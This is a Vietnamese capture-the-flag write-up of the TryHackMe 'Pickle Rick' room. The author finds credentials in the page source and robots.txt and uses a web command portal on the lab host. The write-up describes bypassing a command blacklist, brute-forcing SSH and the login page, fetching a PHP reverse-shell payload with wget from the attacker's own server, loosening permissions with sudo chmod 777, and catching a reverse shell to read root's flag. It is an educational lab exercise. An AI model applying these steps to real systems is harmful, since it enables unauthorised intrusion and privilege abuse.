### Yêu cầu
- Cho trước:
    * Host: 10.10.55.49 (có thể khác)
    * Web app: https://10-10-55-49.p.thmlabs.com/
- Tìm đủ 3 flags.
### Let's go
- Mở vào trang web, đầu tiên mình thấy không có gì khả nghi. Mình xem page source thì thấy 1 đoạn comment chứa tên tài khoản: `R1ckRul3s`. Phán đoán ban đầu, mình cho rằng có thể là tài khoản đăng nhập vào trang quản trị, hoặc ssh.
- Dùng nmap quét host, chỉ có 2 cổng tcp mở: 80 http, 22 ssh, cùng một số cổng udp nào đó (mình cũng không rõ về các services chạy udp đó).
- Điều đầu tiên mình nghĩ đến là Brute force password vào ssh với username `R1ckRul3s`. Nhưng sau khi Brute force không được, mình mới thử ssh vào host với username `R1ckRul3s` và nhận được thông báo Permission Denied (public key). Mình đoán username R1ckRul3s không đúng.
- Kiểm tra version của service ssh bằng `nmap -sV`, mình thấy ssh có version OpenSSH 7.6p1 (version này có lỗ hổng có thể khai thác username enumeration). Mình khai thác username enumeration thông qua Metasploit với hy vọng tìm kiếm được username. Tuy nhiên, kết quả là không nhận được gì cả.
- Tạm bỏ qua ssh, mình quay trở lại với webapp.
- Dùng gobuster để enum webapp. Kết quả trả ra một vài thứ khá hay ho:
  * /assets 
  * /robots.txt 
  * /login.php 
  * /portal.php 
- Truy cập vào https://10-10-55-49.p.thmlabs.com/robots.txt , mình thấy có đúng 1 dòng `Wubbalubbadubdub`. Mình đoán nó là mật khẩu của tài khoản `R1ckRul3s` tìm thấy trước đó.
- Truy cập vào https://10-10-55-49.p.thmlabs.com/login.php , hiển thị 1 form đăng nhập. Nhập vào username `R1ckRul3s` và password `Wubbalubbadubdub`, authenticate thành công và được redirect đến portal.php.
- Tại đây xuất hiện 1 ô input để thực thi command trên server host. Như thói quen, mình thử `ls -la`. Kết quả trả về các file đã enum được trước đó, thêm vào đó là 2 file mình thấy khả nghi: Sup3rS3cretPickl3Ingred.txt , clue.txt. 
- Mình thử dùng `cat`, `more` để xem 2 file nhưng bị block -> có 1 vài lệnh trong blacklist. Mình dùng `less` để xem thì lại được. Hoặc có thể truy cập trực tiếp từ browser URL. Ok nội dung trong file Sup3rS3cretPickl3Ingred.txt chính là flag đầu tiên cần tìm. Nội dung trong file clue.txt là `Look around the file system for the other ingredient.` - ý nói cần tìm thêm các chỗ khác để lấy 2 flag còn lại.
- Dùng `pwd`, trả về /var/www/html, đây là thư mục chứa content web app.
- Dùng `whoami`, trả về www-data.
- Dùng `ls -la /home` để xem có thể có những thư mục người dùng nào, kết quả trả về có ubuntu và rick. Xem qua thư mục ubuntu không có gì, còn thư mục rick có file second ingrendients. Đây có vẻ là flag thứ 2.
- Vì tên file chứ space nên không thể mở như bình thường được. Mình dùng `less /home/rick/second\ ingredients` và xem được nội dung file. Đây chính xác là flag thứ 2.
- Lúc này việc tìm flag thứ 3 khiến mình gặp khá nhiều thời gian vì không tìm được manh mối nào có ích.
- View page-source portal.php, có 1 dòng comment nội dung là 1 đoạn mã base64, mình decode đoạn mã đó lại ra 1 đoạn mã base64 khác. Mình cứ vậy mà decode khoảng 9-10 lần thì thấy kết quả cuối là`rabbit hole`.
- Mình đã xem file config ssh bằng `less /etc/ssh/sshd_config` và thấy dòng `PasswordAuthentication no` -> không thể đăng nhập ssh bằng mật khẩu.
- Mình thử brute force trang login.php với các từ khóa liên quan đến rabbit hole, rick, root, ubuntu,... nhưng cũng không thành công.
- Sau đó mình dùng `less login.php` mới thấy chỉ authen tài khoản `R1ckRul3s` và mật khẩu `Wubbalubbadubdub`. 
- Về mãi sau, khi tìm đủ 3 flag, mình search `rabbit hole in linux`, mới hiểu có vẻ như đó là 1 hint để xem nội dung file bằng các câu lệnh khác (nhưng trên thực tế mình cũng không dùng đến rabbit hole). Hoặc đó là 1 cú lừa ~~.
- Mình thử dùng netcat để tạo reverse shell và cả php-reverse-shell-payload nhưng đều không thành công. Sau đó, mình mở http server ở local và dùng `wget <LHOST> <LPORT> php-reverse-shell.php` để upload payload lên host. Ở local báo file đã được get thành công nhưng check trên server mình lại không thấy. Có thể không được phép chỉnh sửa hay tạo file trong folder này.
- Mình thử touch 1 file bất kỳ nhưng không được.
- Dùng `sudo chmod 777 /var/www/html` và upload payload lại thì lại được.
- Dùng thêm `sudo chmod 777 php-reverse-shell.php` cho chắc.
- Chạy netcat  dưới local để lắng nghe và chạy payload trên server, ta có được reverse shell.
- Mình xem qua 1 vòng hệ thống, thử vào /root thì ú òa, có file `3rd.txt`, đọc nội dung file và có ngay flag thứ 3.
- Trên thực tế thì chỉ cần đơn giản chạy `sudo ls -la /root` và `less /root/3rd.txt` ở trên ô input trang portal.php là có thể lấy được flag thứ 3. Nhưng do mình luôn muốn có được reverse shell trên server nên mới tìm cách để upload payload lên.
- Đây là 1 CTF ở mức độ Easy nhưng mình cũng đã mất khá nhiều thời gian để tìm đủ 3 flag, nhất là flag 3. Một vài điều thú vị mình đã thực hiện mặc dù không cần thiết: chmod /var/www/html để upload được payload lên, lấy được reverse shell. Ở các bước đầu tiên, nếu bạn làm theo hướng upload payload và lấy reverse shell thì cũng không cần quan tâm đến blacklist gì cả.
- Có 1 điều thú vị là mình đã suy nghĩ rất nhiều về `rabbit hole`, rằng không biết `rabbit hole` để làm gì, hay gợi ý điều gì, hay chỉ đơn giản là đánh lạc hướng. Cuối cùng mình nghĩ đó là 1 hint nói rằng hãy bypass blacklist =)).
- Ok đến đây thôi. Happy hacking!
